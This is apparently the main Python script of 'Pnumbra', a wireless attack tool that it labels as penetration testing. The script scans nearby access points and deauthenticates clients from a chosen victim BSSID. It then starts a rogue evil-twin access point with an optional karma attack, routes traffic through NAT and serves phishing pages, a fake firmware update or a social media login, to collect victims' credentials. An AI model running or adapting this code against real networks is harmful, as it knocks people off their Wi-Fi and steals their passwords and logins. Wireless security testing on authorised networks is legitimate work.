#!/usr/bin/env python3

from core.arpspoof import spoofing, getmac
from core.dnsspoof import process_packet, modify
from core.dump import scanner
from core.httpserver import MyHandler, openfile
from core.sniffer import sniff
from core.banner import *
from core.begin import *
from threading import Thread
from subprocess import PIPE, DEVNULL, Popen, check_output
from functools import partial
from core.accesspoint import accesspoint
from core.monitor import *
import argparse
import os, time
import configparser

if __name__ == "__main__":
    try:   
        banner()
        parser = argparse.ArgumentParser(description="Pnumbra tool is a wireless penetration testing tool for evil twin and mitm attack")
        eviltwin = parser.add_argument_group("Evil Twin Attack option")

        eviltwin.add_argument("-i", "--interface",
            dest="interface",
            default="wlan0",
            help="Interface to use, default is wlan0")
        eviltwin.add_argument("--ssid", "-s",
            dest="ssid",
            default="Free Wifi",
            help="Rogue Access Point essid")
        eviltwin.add_argument("--bssid",
            dest="bssid",
            help="Victim's AP bssid")
        eviltwin.add_argument("-c", "--channel",
            dest="channel",
            default="6",
            help="Victim's AP channel")
        eviltwin.add_argument("-kA",
            dest="karma_enable",
            help="Enabling Karma Attack",
            action="store_true")
        eviltwin.add_argument("--limit-redirect",
            dest="limit_redirect",
            help="Limit redirect page (look at config.ini file)",
            action="store_true")   
        eviltwin.add_argument("-Id", "--interface-deauth",
            dest="interface_deauth",
            help="Interface that use monitor mode for deauthentication example: wlan1",
            default="wlan0")
        eviltwin.add_argument("-Ia", "--interface-ap",
            dest="interface_ap",
            help="Interface that support for AP mode or managed mode example: wlan0")
        eviltwin.add_argument("-Ii", "--interface-internet",
            dest="interface_internet",
            default="eth0",
            help="Interface that  connect to internet access example: eth0 or usb0 (default is eth0)")
        eviltwin.add_argument("-t", "--time-out",
            dest="time_out",
            help="Time pause for scanning AP, default is 10",
            default=10,
            type=int)
        eviltwin.add_argument("-Dd",
            dest="disable_deauth",
            help="Disable Deauthentication Attack",
            action="store_true")
        eviltwin.add_argument("--interactive-mode",
            dest="interactive",
            help="mode for to make user easier",
            action="store_true")
        args = parser.parse_args()
        

        IFACE = args.interface
        SSID = args.ssid
        BSSID = args.bssid
        CHANNEL = args.channel
        KARMA_ENABLE = args.karma_enable
        LIMIT_REDIRECT = args.limit_redirect
        IDEAUTH = args.interface_deauth
        IAP = args.interface_ap
        IINTERNET = args.interface_internet
        TIME_OUT = args.time_out
        DEAUTH_DISABLE = args.disable_deauth
        INTERACTIVE = args.interactive
        IFACE_MON = "pnumbra-mon0"

        NOW = time.strftime("[ %H:%M:%S ]")
        print(f"{GREEN}{NOW}{RESET} Starting pnumbra")
        check_root()
        confighttp = configparser.ConfigParser()
        confighttp.read("config.ini")
        port = int(confighttp["Server"]["port"])
        check_port(port)
        info("Killing Network Manager")
        info("Killing WPA Supplicant")
        kill_network()
        if INTERACTIVE:
            IFACE = quest("Enter Interface(example: wlan0)")
            CHANNEL = quest("Enter channel for rogue AP (default 6)")
            if CHANNEL not in "1234567890":
                CHANNEL = "6"
            deauth = quest("Are you want to activate deauth attack [Y/n]")
            if deauth.lower() != "n":
                IDEAUTH = quest("Enter Interface for Deauth Attack (example: wlan1)")
                accesspoint.check_interface(IDEAUTH)
                DEAUTH_DISABLE = False
            try:
                TIME_OUT = int(quest("Enter time out(seconds) for dump wifi (default 10)"))
            except ValueError:
                TIME_OUT = 10
            KARMA_ENABLE = quest("Are you want to activate karma attack [Y/n]")
            if KARMA_ENABLE.lower() != "n":
                KARMA_ENABLE = True
            LIMIT_REDIRECT = quest("Activate limit redirect (look for config.ini file) [y/N]")
            if LIMIT_REDIRECT.lower() != "y":
                LIMIT_REDIRECT = False
            else:
                LIMIT_REDIRECT = True
            IINTERNET = quest("Enter interface was connect to Internet (default eth0)")
            if IINTERNET == "": IINTERNET = "eth0"
            accesspoint.check_interface(IINTERNET)

        accesspoint.check_interface(IDEAUTH)
        monitorer = mon(IDEAUTH)
        monitorer.make_monitor()
        accesspoint.check_interface(IFACE_MON)
        monitorer.mon_iface_upper()
        dump = Dump()
        info("Please wait..  if  time out was longer, you will get the more APs")
        targets = dump.send_packet(IFACE_MON, TIME_OUT)
        print(targets)
        BSSID = quest("Enter BSSID")
        SSID = quest("Enter SSID")

        print('''
=====================================
         Select your method
=====================================

[1] Firmware Update (Default)
[2] Social Media Login
[3] Use custom page (you must edit file config.ini)

''')
        method = input("pnumbra> ")
        if method == '2':
            indexpage = 'phishing-page/socmed/index.html'
            responsepage = 'phishing-page/socmed/result.html'
        elif method == '3':
            indexpage = confighttp["phishing_page"]["index_path"]
            responsepage = confighttp["phishing_page"]["response_path"]
        else:
            indexpage = 'phishing-page/firmware/index.html'
            responsepage = 'phishing-page/firmware/response.html'
        
        info("Set interface '{}' for accesspoint".format(IFACE))
        if KARMA_ENABLE:
            info("Enabling karma attack")
        _accesspoint = accesspoint(IFACE, KARMA_ENABLE)
        _accesspoint.check_interface(IFACE)
        _accesspoint.iface_upper(IFACE)
        if LIMIT_REDIRECT:
            info("Make accesspoint with limit redirect")
        _accesspoint.make_config(LIMIT_REDIRECT, SSID, CHANNEL)

# menyalakan accesspoint
        info("Starting Access Point with name: "+SSID)
        info("Starting Access Point from channel: "+CHANNEL)
        ap = Thread(target=_accesspoint.startAP)
        ap.daemon = True
        ap.start()
        ok("Access Point started")
# menyalakan dhcp
        dhcp = Thread(target=_accesspoint.startDHCP)
        dhcp.daemon = True
        dhcp.start()
# firewall
        clear_rules()
        info("Set interface '{}' for internet".format(IINTERNET))
        nat(IINTERNET, IFACE)
        # redirect_localhost()

#deauth attack 
        if not DEAUTH_DISABLE:
            _deauth = Deauth()
            packet = _deauth.make_packet(BSSID)
            dump.daemon(_deauth.send_packet, packet)
        else:
            mon.disable_mon_mode()
            
# menyalakan service web
        server_address = ('', port)
        from http.server import HTTPServer
        handler_class = partial(MyHandler, indexpage, responsepage)
        httpd = HTTPServer(server_address, handler_class)
        print ('Server running at {}:{}...'.format('localhost', port))
        httpd.serve_forever()

    except KeyboardInterrupt:
        NOW = time.strftime("[ %H:%M:%S ]")
        print(f"{RED}{NOW}{RESET} Ctrl+C detected")
        warn("Exiting ..")
        clear_rules()
        
        
